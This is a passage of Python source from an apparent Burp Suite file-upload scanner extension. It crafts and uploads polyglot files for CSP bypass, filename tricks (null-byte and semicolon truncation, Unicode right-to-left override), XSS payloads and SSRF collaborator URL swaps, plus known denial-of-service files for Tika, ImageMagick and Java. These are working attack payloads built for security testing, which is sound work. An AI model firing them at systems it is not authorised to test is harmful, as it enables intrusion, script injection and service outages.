            alternative_issue.detail += "It was detected that the file was processed on the server side (probably " \
                                        "GraphicsMagick), however, it seems that a polyglot is still feasible with the " \
                                        "processing taking place."
            alternative_content = 'GIF89a= \' \xf5$\x00\x00\x00\x00(\x00\x00Y\x00\x00ddd\x80\x80\x80\x8e\x8e\x8e\x96\x96\x96\x99\x99\x99\xaa' \
                                  '\x00\x00\xaa\xaa\xaa\xbc\x00\x00\xbf\xbf\xbf\xc6\x00\x00\xcb\xcb\xcb\xcc\x00\x00\xd4\x00\x00\xdb\x00\x00' \
                                  '\xdb11\xde\xde\xde\xdf??\xe2QQ\xe3[[\xe6jj\xe7\xe7\xe7\xe8{{\xeb\x87\x87\xeb\x8a\x8a\xed\x94\x94\xf1\xab' \
                                  '\xab\xf2\xb1\xb1\xf4\xbe\xbe\xf4\xc3\xc3\xf7\xcd\xcd\xf9\xdc\xdc\xfa\xe1\xe1\xfd\xfd\xfd\xff\xff\xff\xff' \
                                  '\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff' \
                                  '\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff' \
                                  '\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff' \
                                  '\xff\xff!\xf9\x04\x00\x00\x00\x00\x00!\xfe\xc7;document.getElementById("jsoutput").inerHTML = "ThinkFu r' \
                                  'eckons Caja is rather neat."; /*'
            self.dl_matchers.add(DownloadMatcher(alternative_issue, filecontent=alternative_content, check_not_content_disposition=True))
            self._send_simple(injector, types, basename, content, redownload=True)

        # We always send this, as long as the polyglot module is activated, we assume the user wants this...
        basename = BurpExtender.DOWNLOAD_ME + self.FILE_START + "CorkamixPePdfJarHtml"
        content = 'eJytVF9PE0EQn4Ni4fgrUDXGhxVjWmLao0QjoccFKG2EUmxoYwykMdfe0i7e3TZ3C6FRnvwofgJN9MEHX/TJxFe/jIk6e1dsoeCTu9nb2Zm5385Mfjv' \
                  'FvZV0puUxVyTmstx7aRY3n5P9Vls0uVudm799v7SRT6ZTKq8d6rph+MKjpqPqTeHYxioAlHIA2wpcGAPKqNJFK+WqsHTOZxUi+I30aCKg17jVNnz08' \
                  'zq+gxdhO2O8Ry703f1/hsQd/od98tZScw/z+B0rKKvw483XyBfaE8oLJYRw/OO6JwCCCh+ENt0XbZsaMl3yihwzn9WYzUR7ucksi7qZU5JyzxtC2aY' \
                  'Z0uI+E4y7y8Ss+dw+ElJnWhZzG8tkgaTpSfjNEMf0Ggz9FjJE8Faw2/RABMIpaabxhtAlGZpTD7t/JWtcCO5I7ZLUnupaGLNusWNSt03fX3ENovt1j' \
                  '7UEEe0WXYkLeiK0Q/PYDLVxw7SpJxLxLg+eVIrbD7bQoxx4VOPzGQQOZEO/m0yWCoMR9dJqj+Aq5ipryc2dvNbvdq+zZnvdims7m/lcuZIq5rNIWkG' \
                  't5DqWMq0WTcwwK5NYJnUZnMNO1H7Qn0q4JlA+c0sFuX/79ekzkjMJN6PIdBg+s0YhosCULIFmm25De1o7pHWhQMTBGxW4kdjf7hrLAinRyMw/Q3uWW' \
                  '3QEkxyNgnoOodz2BXXGYAzGFRjkRwgWCzEY10qSU+XgQWaGYVKBO91SyyqT7PZauUyYS7bWdqsqXIeZKEwrMHMJwBjWLqZANOCpjcHGEpfH+p26Vqc' \
                  'JoIRdQU0j44LuoBWY5e/jXjI96goiDbtalrsCT/7+ojxWDaOq7VKfH3l16suOYhiLZwB/28t6RbPogXlkC7K0QCoHARTyGufj9CNScRI9zWUjX52vH' \
                  'JJcRe0LTXgmQxJiSLuciyCyBvXDwOTNKig4wzajYP2H4BruUTzFYADkcx55D8PTEx9h6l1IilJBGZiFq0kajqnO3kPZ/t96SRsOgit+BYUvQ+hlaBf' \
                  'hdR9fS4Wha9I6iPMD7m8H5OkP3+Q/0w=='
        content = content.decode("base64").decode("zlib")
        # we only upload as PDF type as that is the likeliest to succeed of all those formats
        title = "CSP Bypass"
        desc = 'A file that is a PDF, Jar, HTML, JavaScript and PE file at the same time (corkamix) can be uploaded and downloaded, which allows CSP bypasses. The '
        desc += 'file was taken from https://code.google.com/archive/p/corkami/downloads?page=2 . '
        issue = self._create_issue_template(injector.get_brr(), title, desc, "Firm", "Low")
        self.dl_matchers.add(DownloadMatcher(issue, filecontent=content, check_not_content_disposition=True))
        self._send_simple(injector, self.PDF_TYPES, basename, content, redownload=True)

        if injector.opts.file_formats['zip'].isSelected():
            basename = BurpExtender.DOWNLOAD_ME + self.FILE_START + "JsZip"
            content = "prompt(123);PK\x03\x04\x14\x00\x00\x00\x00\x00\xeb\x91[J\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\t\x00\x00\x00" \
                      "empty.txtPK\x01\x02\x14\x03\x14\x00\x00\x00\x00\x00\xeb\x91[J\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\t\x00" \
                      "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa4\x81\x00\x00\x00\x00empty.txtPK\x05\x06\x00\x00\x00\x00\x01\x00\x01\x00" \
                      "7\x00\x00\x00'\x00\x00\x00\x00\x00"
            title = "CSP Bypass"
            desc = 'A file that is a JavaScript and Zip file at the same time can be uploaded and downloaded, which allows CSP bypasses. The ' \
                    'file is just the JavaScript prompt function with a concatenated zip file with an empty.txt in it. As zip files do not need ' \
                    'to start at the beginning of the file, some implementations unzip this file just fine. '
            issue = self._create_issue_template(injector.get_brr(), title, desc, "Firm", "Low")
            self.dl_matchers.add(DownloadMatcher(issue, filecontent=content, check_not_content_disposition=True))
            self._send_simple(injector, self.ZIP_TYPES, basename, content, redownload=True)

        return colab_tests

    def _fingerping(self, injector):
        if not injector.opts.file_formats['png'].isSelected():
            # we only upload PNG files in this module
            return
        if not injector.opts.redl_enabled or not injector.opts.redl_configured:
            # this module can only fingerprint when the files are downloaded again
            return
        f = Fingerping()
        # we only send the fingerping files as valid PNG files
        types = [('', '.png', 'image/png')]
        downloads = {}
        number_of_responses = 0
        last_picture = ''
        last_status_code = 0
        # First, we need to upload the test files
        for orig_filename in FingerpingImages.all_images:
            downloads[orig_filename] = None
            # it doesn't really matter which filename in the upload request we use as long as we know
            # which original filename it was. So let's remove - and _ in the filename for consistency in this extension
            basename = self.FILE_START + "Fingerping" + orig_filename.replace("-", "").replace("_", "")
            content = FingerpingImages.all_images[orig_filename]
            urrs = self._send_simple(injector, types, basename, content, redownload=True)
            if urrs:
                # With one member of types, we also only get one:
                urr = urrs[0]
                if urr and urr.download_rr:
                    i_response_info = self._helpers.analyzeResponse(urr.download_rr.getResponse())
                    resp = FloydsHelpers.jb2ps(urr.download_rr.getResponse())
                    body_offset = i_response_info.getBodyOffset()
                    body = resp[body_offset:]
                    if body.startswith('\x89PNG'):
                        # print "Downloaded", orig_filename, "is a PNG. Content:"
                        # print repr(body)
                        # Make sure this image is not the same as *the last* image we uploaded and successfully downloaded
                        # but where the upload response had a different status code.
                        # This is necessary because otherwise we get a lot of false positives/incorrect results
                        # as the extension thinks the file was uploaded successful, but it was not changed and the
                        # image is just the last test we uploaded, not the current. This is not optimal, as the response
                        # might better indicate if a file was successfully parsed/modified or not. Actually,
                        # the non-ordering of Python dictionary helps, as FingerpingImages.all_images is not
                        # iterated in the sequence it was initialized with, so pictures that are not *exactly* the
                        # same but look the same (eg. color test) but a server tool might convert to the exact same image
                        # are not uploaded after each other... This works OKish so far.
                        status_code = self._helpers.analyzeResponse(urr.upload_rr.getResponse()).getStatusCode()
                        if body == last_picture and not last_status_code == status_code:
                            print "Fingerping: Ignoring downloaded picture", orig_filename, "as it probably didn't change on server"
                        else:
                            last_picture = body
                            last_status_code = status_code
                            downloads[orig_filename] = body
                            number_of_responses += 1
                            # TODO feature: As dominique suggested, detect if it was converted to JPEG by the server
                            # if yes convert JPEGs to PNG and then use them in the same way...

        confidence = "Tentative"
        print "Fingerping module was able to download", str(number_of_responses), \
            "of", str(len(FingerpingImages.all_images)), "images as PNGs again"
        results, fingerprintScores = f.do_tests(downloads, True)
        text_score, total = f.get_results_table(fingerprintScores)
        highest_score = text_score[-1][1]
        score_percentage = float(highest_score) / total

        if score_percentage > 0.6:
            confidence = "Certain"
        elif score_percentage > 0.85:
            confidence = "Firm"

        result_table = "<br>".join([text + " " + str(score) + "/" + str(total) for text, score in text_score])

        title = "Fingerping Fingerprinting results"
        desc = "The fingerping tool is able to fingerprint images libraries that modify a set of png files that are " \
               "uploaded. The original project by Dominique Bongard is located at https://github.com/0xcite/fingerping " \
               "and the fork that is used in this extension here: https://github.com/floyd-fuh/fingerping/ . <br><br>" \
               "Knowing the server side image parser is important to do a security test, for example to check for " \
               "an old version or to go back and fuzz the parser, then exploit it on the server. <br><br>The module " \
               "was able to download {} of {} images as PNGs again (can be good and bad). <br><br>" \
               "The common error case occurs when the server overwrites the same file name again and again but " \
               "keeps the last uploaded content if image transformation fails. UploadScanner tries to detect this " \
               "(different status code) but can not if the status code is the same in success and fail case. After " \
               "all it is not as unlikely that test images are converted to identical images.<br><br>" \
                "The result of the fingerping run is (last line is the most likely match): <br><br>{}<br><br>" \
                "If there was no full match (60/60) and you know the exact library used on the server, please " \
                "consider submitting the following fingerprint at https://github.com/floyd-fuh/fingerping/ " \
                "together with the exact version of the image library on the server. Please also make sure " \
                "that the common error case does not apply." \
               "<br><br>{}".format(str(number_of_responses), str(len(FingerpingImages.all_images)),
                               result_table, repr(results))
        issue = self._create_issue_template(injector.get_brr(), title, desc, confidence, "Information")
        self._add_scan_issue(issue)


    def _quirks_with_passive(self, injector):
        if not injector.get_uploaded_filename():
            # If the request does not contain a filename, there is no point in doing these requests
            return
        # TODO feature: Surrogate pairs? Invalid overlong Unicode?
        # TODO feature: in general feedback to this module...
        orig_content = injector.get_uploaded_content()
        base_request_response = injector.get_brr()
        random_part = ''.join(random.sample(string.ascii_letters, 3))

        file_extension = FloydsHelpers.u2s(injector.get_default_file_ext())
        semicolon_ie = BurpExtender.DOWNLOAD_ME + "Semicolon" + random_part+".exe;" + file_extension
        title = "Semicolon in Content-Disposition"
        desc = 'Internet explorer might interprete a HTTP response header of Content-Disposition: attachment; filename="evil_file.exe;.txt" as an exe file. ' + \
               "A filename of " + semicolon_ie + " was uploaded and detected that it's possible to download a file named " + BurpExtender.MARKER_URL_CONTENT + " ."
        issue = self._create_issue_template(base_request_response, title, desc, "Certain", "Low")
        self.dl_matchers.add(DownloadMatcher(issue, filename_content_disposition=semicolon_ie))
        self.dl_matchers.add(DownloadMatcher(issue, filename_content_disposition=BurpExtender.DOWNLOAD_ME + "Semicolon"+random_part+".exe%3B" + file_extension))
        self.dl_matchers.add(DownloadMatcher(issue, filename_content_disposition=BurpExtender.DOWNLOAD_ME + "Semicolon"+random_part+".exe%3b" + file_extension))
        req = injector.get_request(semicolon_ie, orig_content)
        if req:
            self._make_http_request(injector, req, redownload_filename=semicolon_ie)

        nulltruncate = BurpExtender.DOWNLOAD_ME + "Nulltruncate" + random_part + ".exe\x00" + file_extension
        title = "Null byte filename truncate"
        desc = 'A filename of ' + cgi.escape(nulltruncate) + " (including a truncating zero byte after .exe) was uploaded and detected that it's possible to download a file named " + BurpExtender.MARKER_URL_CONTENT + " ."
        issue = self._create_issue_template(base_request_response, title, desc, "Certain", "Low")
        exp = BurpExtender.DOWNLOAD_ME + "Nulltruncate" + random_part + ".exe"
        self.dl_matchers.add(DownloadMatcher(issue, filename_content_disposition=exp,
                                             not_in_filename_content_disposition=file_extension))
        self.dl_matchers.add(DownloadMatcher(issue, url_content=exp, not_in_url_content=file_extension, filecontent=orig_content))
        req = injector.get_request(nulltruncate, orig_content)
        if req:
            self._make_http_request(injector, req, redownload_filename=exp)

        backspace = BurpExtender.DOWNLOAD_ME + "Backspace" + random_part + ".exe" + file_extension + "\x08" * len(file_extension)
        title = "Backspace filename truncate"
        desc = "We uploaded a filename of " + backspace + " (having the 0x08 backspace character several time at the end) and detected that it's possible to download a file named " + BurpExtender.MARKER_URL_CONTENT + " ."
        issue = self._create_issue_template(base_request_response, title, desc, "Certain", "Low")
        exp = BurpExtender.DOWNLOAD_ME + "Backspace"+random_part+".exe"
        self.dl_matchers.add(DownloadMatcher(issue, filename_content_disposition=exp,
                                             not_in_filename_content_disposition=file_extension))
        self.dl_matchers.add(DownloadMatcher(issue, url_content=exp, not_in_url_content=file_extension, filecontent=orig_content))
        req = injector.get_request(backspace, orig_content)
        if req:
            self._make_http_request(injector, req, redownload_filename=exp)

        left_to_right = BurpExtender.DOWNLOAD_ME + "\xe2\x80\xaeexe.thgirottfel" + random_part + file_extension
        random_part_reverse = random_part[::-1]
        title = "UTF-8 Unicode left to right overwrite"
        desc = "We uploaded a filename of {} (which has the UTF-8 verison of left to right overwrite " \
               "unicode char 0xE280AE) and detected that it's possible to download a file named {} . " \
               "How such a file is presented to the user is dependent on the HTTP client.".format(left_to_right, BurpExtender.MARKER_URL_CONTENT)
        issue = self._create_issue_template(base_request_response, title, desc, "Certain", "Low")
        expected_filenames = (
            left_to_right,
            BurpExtender.DOWNLOAD_ME + file_extension[::-1] + random_part_reverse + "lefttoright" + ".exe",
            BurpExtender.DOWNLOAD_ME + "%E2%80%AEexe.thgirottfel"+ random_part + file_extension,
            BurpExtender.DOWNLOAD_ME + "%e2%80%aeexe.thgirottfel"+ random_part + file_extension,
            BurpExtender.DOWNLOAD_ME + "%u202Eexe.thgirottfel"+ random_part + file_extension,
            BurpExtender.DOWNLOAD_ME + "%u202eexe.thgirottfel"+ random_part + file_extension,
        )
        for exp in expected_filenames:
            self.dl_matchers.add(DownloadMatcher(issue, filename_content_disposition=exp))
            self.dl_matchers.add(DownloadMatcher(issue, url_content=exp, filecontent=orig_content))
        req = injector.get_request(left_to_right, orig_content)
        if req:
            self._make_http_request(injector, req, redownload_filename=left_to_right)

        left_to_right2 = BurpExtender.DOWNLOAD_ME + "\xe2\x80\xae" + str(file_extension[::-1]) + "thgirottfel" + random_part + ".exe"
        title = "UTF-8 Unicode left to right overwrite"
        desc = "We uploaded a filename of {} (which has the UTF-8 verison of left to right overwrite unicode char " \
               "0xE280AE) and detected that it's possible to download a file named {} . How such a file is presented " \
               "to the user is dependent on the HTTP client.".format(left_to_right2, BurpExtender.MARKER_URL_CONTENT)
        issue = self._create_issue_template(base_request_response, title, desc, "Certain", "Low")
        expected_filenames = (left_to_right2, BurpExtender.DOWNLOAD_ME + "exe." + random_part_reverse + "lefttoright" + file_extension)
        for exp in expected_filenames:
            self.dl_matchers.add(DownloadMatcher(issue, filename_content_disposition=exp))
            self.dl_matchers.add(DownloadMatcher(issue, url_content=exp, filecontent=orig_content))
        req = injector.get_request(left_to_right2, orig_content)
        if req:
            self._make_http_request(injector, req, redownload_filename=left_to_right2)

        rfc_2047 = BurpExtender.DOWNLOAD_ME + "=?utf-8?q?" + random_part + "Hi=21" + file_extension + "?="
        title = "RFC 2047 in Content-Disposition"
        desc = "A strange encoding found in RFC 2047. Recognized in some headers in Firefox and Chrome including Content-Disposition. We uploaded a filename of " + rfc_2047 + " and detected that it's possible to download a file named " + BurpExtender.MARKER_URL_CONTENT + " ."
        issue = self._create_issue_template(base_request_response, title, desc, "Certain", "Low")
        expected_filenames = (rfc_2047, BurpExtender.DOWNLOAD_ME + random_part + "Hi!" + file_extension)
        for exp in expected_filenames:
            self.dl_matchers.add(DownloadMatcher(issue, filename_content_disposition=exp))
        req = injector.get_request(rfc_2047, orig_content)
        if req:
            self._make_http_request(injector, req, redownload_filename=rfc_2047)

    def _quirks_without_passive(self, injector):
        if not injector.get_uploaded_filename():
            # If the request does not contain a filename, there is no point in doing these requests
            return
        # TODO feature: in general feedback to this module...
        file_extension = injector.get_default_file_ext()
        # The checks that have no passive checks, simply send them:
        payloads = (
            "A" * 9990 + file_extension,  # just a very long filename, generated PHP error "Warning</b>:  move_uploaded_file(" in the past
            "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f" + file_extension,
            "%01%02%03%04%05%06%07%08%09%0a%0b%0c%0d%0e%0f%10%11%12%13%14%15%16%17%18%19%1a%1b%1c%1d%1e%1f" + file_extension,
            "".join([struct.pack("B", x) for x in range(0x20, 0x2f)]) + file_extension,
            "%" + "%".join([struct.pack("B", x) for x in range(0x20, 0x2f)]) + file_extension,
            '\xff\xfe<\x00s\x00c\x00r\x00i\x00p\x00t\x00>\x00a\x00l\x00e\x00r\x00t\x00(\x001\x002\x003\x00)\x00<\x00/\x00s\x00c\x00r\x00i\x00p\x00t\x00>\x00',
            # BOM_UTF-16_LE
            '\xfe\xff\x00<\x00s\x00c\x00r\x00i\x00p\x00t\x00>\x00a\x00l\x00e\x00r\x00t\x00(\x001\x002\x003\x00)\x00<\x00/\x00s\x00c\x00r\x00i\x00p\x00t\x00>',
            # BOM_UTF-16_BE
            'COM1',
            'COM1' + file_extension,
            # not allowed on Windows as a file name: CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8, and LPT9
            'test.exe:',
            'test.exe:' + file_extension,
            # Also not allowed on windows
            'test.{D20EA4E1-3957-11d2-A40B-0C5020524153}',
            'test::{D20EA4E1-3957-11d2-A40B-0C5020524153}',
            # a Windows feature called CLSID https://www.tenforums.com/tutorials/3123-clsid-key-guid-shortcuts-list-windows-10-a.html but it must be a folder name!
            '*',
            '*' + file_extension,
            # can get really weird results, as this file could afterwards result in being the only match to a unix search
            # for ./* while actually such a search should match everything
            '.', # Generated PHP error "move_uploaded_file(): The second argument to copy() function cannot be a directory" in the past
            '.' + file_extension,
        )
        content = injector.get_uploaded_content()
        for i in payloads:
            req = injector.get_request(i, content)
            if req:
                self._make_http_request(injector, req)

    def _generic_url_do_replace(self, burp_colab, prot, orig_content):
        # Case destroying the file size (e.g. for XML things)
        colab_url = burp_colab.generate_payload(True)
        content_replace = orig_content.replace(prot, prot + colab_url + "/")
        yield content_replace, colab_url

        # Case keeping the file size and hopefully if we are lucky even the correct file format (e.g. for ASN1)
        new_content = ""
        search_content = orig_content
        colab_url2 = burp_colab.generate_payload(True)
        while prot in search_content:
            index = search_content.find(prot)
            new_content += search_content[:index]
            payload = prot + colab_url2 + "/"
            new_content += payload
            search_content = search_content[index + len(payload):]
        new_content += search_content
        # If we have a prot at the very end the new_content will be too large, so truncate:
        new_content = new_content[:len(orig_content)]
        yield new_content, colab_url2


    def _generic_url_replacer(self, injector, burp_colab):
        # Burp community edition doesn't have Burp collaborator
        if not burp_colab:
            return []
        # burp collaborator based URL replacing
        # Simply replaces all http:// with http://burp.collaborator.domain/
        # eg.
        # http://www.example.org/file.cgi?test=123
        # turns into:
        # http://burp.collaborator.domain/www.example.org/file.cgi?test=123

        name = "URL replacement collaborator interaction"
        severity = "Medium"
        confidence = "Tentative"
        detail = "A Burp Colaborator interaction was detected when replacing all ftp, http and https " \
                 "URLs with a burp colaborator URL. This means that Server Side Request Forgery is possible " \
                 "if this request was coming from the server. " \
                 "Interactions:<br><br>"
        issue = self._create_issue_template(injector.get_brr(), name, detail, confidence, severity)

        colab_tests = []
        filename = injector.get_uploaded_filename()
        name, ext = os.path.splitext(filename)
        orig_content = injector.get_uploaded_content()
        i = 0
        for prot in BurpExtender.PROTOCOLS_HTTP:
            if prot in orig_content:
                for content, colab_url in self._generic_url_do_replace(burp_colab, prot, orig_content):
                    req = injector.get_request(name + str(i) + ext, content)
                    i += 1
                    if req:
                        urr = self._make_http_request(injector, req)
                        if urr:
                            colab_tests.append(ColabTest(colab_url, urr, issue))

        return colab_tests

    def _recursive_upload_files(self, injector, burp_colab):
        # Dimensions are:
        # filename:       from original request, from file
        # file extension: from original request, from file, using the default, guessing by mime type
        # mime_type:      from original request, guessing by file, guessing by file extension
        # File content:   Always from file
        if not injector.opts.ru_dirpath:
            return

        name = "Recursive upload SSRF"
        severity = "Medium"
        confidence = "Certain"
        detail = "A Burp Colaborator interaction was detected when doing the recursive uploads, replacing all URLs within " \
                 "file contents with one that contains a burp colaborator URL. This means that Server Side Request Forgery is possible. " \
                 "You might be able to read local files with this issue, etc. <br>" \
                 "Interactions:<br><br>"
        issue = self._create_issue_template(injector.get_brr(), name, detail, confidence, severity)

        old_name, old_ext = os.path.splitext(injector.get_uploaded_filename())
        colab_tests = []
        for path, _, files in os.walk(injector.opts.ru_dirpath):
            for filename in files:
                filename = FloydsHelpers.u2s(filename)
                filepath = os.path.join(path, filename)
                new_name, new_ext = os.path.splitext(filename)
                if injector.opts.ru_keep_filename:
                    new_name = old_name
                if injector.opts.ru_keep_file_extension:
                    new_ext = old_ext
                mime_type = None
                if not new_ext:
                    new_ext = injector.get_default_file_ext()
                if not injector.opts.ru_keep_mime_type:
                    if injector.opts.ru_believe_file_extension:
                        mime_type = FloydsHelpers.mime_type_from_ext(new_ext)
                    else:
                        m = FloydsHelpers.mime_type_from_content(filepath)
                        if m:
                            mime_type = m
                        else:
                            print "Couldn't find mime_type for", filepath
                            print "Trying file extension"
                            mime_type = FloydsHelpers.mime_type_from_ext(new_ext)
                if injector.opts.ru_guess_file_ext:
                    if mime_type:
                        new_ext = FloydsHelpers.file_extension_from_mime(mime_type)
                    else:
                        new_ext = FloydsHelpers.file_extension_from_mime(FloydsHelpers.mime_type_from_content(filepath))

                content = file(os.path.join(path, filename), "rb").read()
                if not mime_type:
                    mime_type = injector.get_uploaded_content_type()

                # Send the original content first
                new_filename = new_name + "0" + new_ext
                print "Recursive Uploader doing", new_filename, mime_type
                req = injector.get_request(new_filename, content, mime_type)
                if req:
                    self._make_http_request(injector, req)

                # Combine with replacer
                if injector.opts.ru_combine_with_replacer and burp_colab:
                    i = 1
                    for prot in BurpExtender.PROTOCOLS_HTTP:
                        if prot in content:
                            for content, colab_url in self._generic_url_do_replace(burp_colab, prot, content):
                                new_filename = new_name + str(i) + new_ext
                                i += 1
                                print "Recursive Uploader doing", new_filename, mime_type, colab_url
                                req = injector.get_request(new_filename, content, mime_type)
                                if req:
                                    urr = self._make_http_request(injector, req)
                                    if urr:
                                        colab_tests.append(ColabTest(colab_url, urr, issue))
        return colab_tests

    def _fuzz(self, injector):
        content = injector.get_uploaded_content()
        if not content:
            return
        orig_filename = injector.get_uploaded_filename()
        name_increment = 1
        for _ in xrange(0, injector.opts.fuzzer_known_mutations):
            new_content = copy.copy(content)
            index = random.choice(xrange(0, len(new_content)))
            print "At byte index", index, "inserted known fuzz string"
            new_content = new_content[:index] + random.choice(self.KNOWN_FUZZ_STRINGS) + new_content[index + 1:]
            name, ext = os.path.splitext(orig_filename)
            new_filename = name + str(name_increment) + ext
            name_increment += 1
            req = injector.get_request(new_filename, new_content)
            if req:
                self._make_http_request(injector, req)
        for _ in xrange(0, injector.opts.fuzzer_random_mutations):
            new_content = copy.copy(content)
            index = random.randint(0, len(new_content) - 1)
            if random.choice((True, False)):
                # byte change
                print "At byte index", index, "changed to new byte"
                new_content = new_content[:index] + chr(random.randint(0, 255)) + new_content[index + 1:]
            else:
                # bit change
                bit_index = random.randint(0, 7)
                print "At byte index", index, "changed bit", bit_index
                new_byte = chr(ord(new_content[index]) ^ (2 ** bit_index))
                new_content = new_content[:index] + new_byte + new_content[index + 1:]
            name, ext = os.path.splitext(orig_filename)
            new_filename = name + str(name_increment) + ext
            name_increment += 1
            req = injector.get_request(new_filename, new_content)
            if req:
                self._make_http_request(injector, req)

    def _timeout_and_dos(self, injector):
        orig_filename = injector.get_uploaded_filename()
        orig_ct = injector.get_uploaded_content_type()
        attacks = []
        title = "File upload connection timeout"
        desc = "A connection timeout occured when uploading a specially crafted file, it is likely that a high " \
               "ressource consumption on the server-side took place (possible DoS). "


        desc_chm = desc + "The file was found by Hanno Boeck during a fuzzing run with chmlib. However, later when floyd " \
                          "started to fuzz the Java based Apache Tikka project in version 1.17, he found out that this file will " \
                          "also hang the Tikka parser and use 100% CPU at the same time. CVE-2018-1339 was assigned for Tikka. " \
                          "See http://www.openwall.com/lists/oss-security/2018/04/25/7 . "
        content = 'eJzzDAl2Y2ZgYEgAYkYgvsV77AonCwODwF/GmlXVFwTn8TAsOKn07I0gGh+kHgQkoHQFlA4RgNBnoPQ/Rgjdr8mAAjxDggNAUiF' \
                  'AzAUSAKpngrrhPxDA1IHYIDGQm7ImMcXqKV4QnPsT4oYQqDwMBPi6+zBgAxz6yp4uER4uQYyzGRaAeSFOQAeAjNVXDg4J8vT7xc' \
                  'Dwy4oFKBMcGRzi6svQyLbQEMgL8Q/wdA5m3M0gAOSEBvkA1TLulpGDcEKcfBh3C/Bw66u4eaaVZPomZuYxgkxU8Xfy8vQLDmFsd' \
                  'ZxqL6qvEh7uWFycn5yZWJJZluqTmZddrA+0WRarREBRfkFqUUklY6stiyBIhXdqZXl+UQpcmySGIEKLJQu3vkt+cmlual4JWLEI' \
                  'EtczLyW1Qi8jI5ux2bDRWwFJJiQxKSdVIT9NwTk/rwQkAlSVzMjQbCiKpKgktbjEUC+jJDeHsaXGVsTKyiWxJDG4IDE5Vd8vMRf' \
                  'o+uISBgYbDWTx4JL8osT0VH3fYOf83IKi1OLi1BR9qB0Mi8z7YnSIUl2UnwNSxZAlo0lQPVAqzzMvLZ8hiUOfoOKQosS84rT8ol' \
                  'x9sOtt1OJJ0FJt7uZsZGFpYqBr6WJsqGto6AJkORmZ6xoYOBo4Wxq6WjqbO9cCQ724JDEvORVkrh4wRjJpa4V+UGpxagk4Qhk2C' \
                  'htgzQyjYBSMglEwCkbBKBgFo2CIgDf/CasZBTQAjwbaAUMN/P8zINbOYfzLAACSHC2P'.decode("base64").decode("zlib")
        new_title = title
        attacks.append((orig_filename, content, '', new_title, desc_chm))
        if orig_filename or orig_ct:
            attacks.append(("CVE20181339.chm", content, "application/octet-stream", new_title, desc_chm))


        desc_im = desc + "The file was created by floyd during an offline fuzzing run with graphicksmagick. " \
                         "During lab tests for this plugin a timeout (aka 'hang') occured when uploading this file to a " \
                         "server with the following specification:<br>" \
                         "Manual compile of ImageMagick 6.5.4-10 2016-12-19 Q16 http://www.imagemagick.org Copyright (C)" \
                         " 1999-2009<br> PHP 5.3.10-1ubuntu3.13 with Suhosin-Patch (cli) (built: Jul  7 2014 18:52:09) <br>" \
                         "The PHP script basically used the following code with no further checks:<br>" \
                         "shell_exec('convert /tmp/tmpPhpInputFile -resize 50x50 /var/www/uploads/test.png');<br>" \
                         "It is therefore very likely that the server is running an outdated version of ImageMagick or GraphicksMagick. "
        content = 'R\xcc\xe3\x08\x08\x08\x08\x00@\x00\x00\x01\x08\x00 \x02\xf1\x03\x00\x00\x01$!\x00\x01\xffR\x00\xff\x1b\x07\x00' \
                  'R\xcc\xc4\x00\x01\x08\x08\x00\x06\x00\x15\x01\x08\x00\x00\x00\x00\xff\xff\xff\xd4\n\xa3\xf2\x00\t\x00.\x02i\x05' \
                  '\x06\x00$%S\x00\x04 \xff\xceV\xff  \x00\x00\x00\x00\x00 \x00\x00\x01\x00\xfd\xfe\xff\xff\x01\x00\x033\x00\x80v' \
                  '\x1d\x00\x00(\x00\x00\x00 \x00\x00\x00\x13\x02\x01\x00\x00\x00\x0e\x14\x92g \x00\x1e\x00\x00\x00\xfdG\x00\x00H\x00\x00'
        new_title = title
        attacks.append((orig_filename, content, '', new_title, desc_im))

        riff_java_hang = "RIFF\x1d\x1e\xb0\x00WAVEfmt\x00\x00\x10\x00\x00\x00\x80\x04\x084\x80\x04\x08\x01\x05\x00\x01\x00\x00\x00\xf2\x00" \
                         "@\x00\x1b\x01\x00(\x00\x1b\x00\x1a\xe2\x06\x00\x00\x004\x00\x00\x004\x00\xfa\xff\xf9\x00\x1c\x01\x03\x7f\xff\xff" \
                         "\xff\x81\x02\x00\x00\x00(\x01\x03\x00\x01\x00\x00\x00\x10\x00\x00\x00\x80\x04\x084\x80\x04\x08\x01\x05\x00\x01" \
                         "\x00\x00\x00\xf2\x00@\x00\x1b\x01\x05\x00\x01\x00\x00\x00\xfa\xff\xf9\x00\x1c\x01\x03\x00\x01\x00\x00\x00\x02\x00" \
                         "d\x00(\x01\x03\x00\x01\x00\x00\x00\x10\x00\x00\x001\x01$\x00^^^\x00tttttttttt\x00\x00S\x01\x03\x00\x02\x00\x00" \
                         "\x00\x00\x00\x00\x00 \x00\xe8\x03a'\x01\x00\x002\x01 \x00\x14\x00\x00\x00D\x01\x00\x00;\xff\x00\r\n\x00\x00\x00" \
                         "[\x01,\x00tttttttttt\x02\x7fS\x00\xf6\x00\x02\x7f\xff\x00\x00\x00\x00\x00 \x00\xe8\x03ad1"
        desc_riff = desc + "The file was created by floyd during an offline fuzzing run with Apache Tika,  However, Tim Allison then " \
                         "realized it affects Java before version 10 and its RIFF parser. I only rediscovered this issue basically: <br>" \
                         "https://bugs.openjdk.java.net/browse/JDK-8135160<br>" \
                         "Unfortunately, there was never a CVE assigned to this. " \
                         "It is therefore very likely that the server is running Java before version 10. "
        new_title = title
        attacks.append((orig_filename, riff_java_hang, '', new_title, desc_riff))
        if orig_filename or orig_ct:
            attacks.append(("riffhang.wav", riff_java_hang, '', new_title, desc_riff))

        if injector.opts.file_formats['tiff'].isSelected():
            content = "TU0AKgAAC9QCBBU8C//////x///H4BAX/4BX+FqigD4f///+Bpf//8fkhd//13/4SKyk39f///gAA///z/4Bf//gx/gRASUP+///8CQb////" \
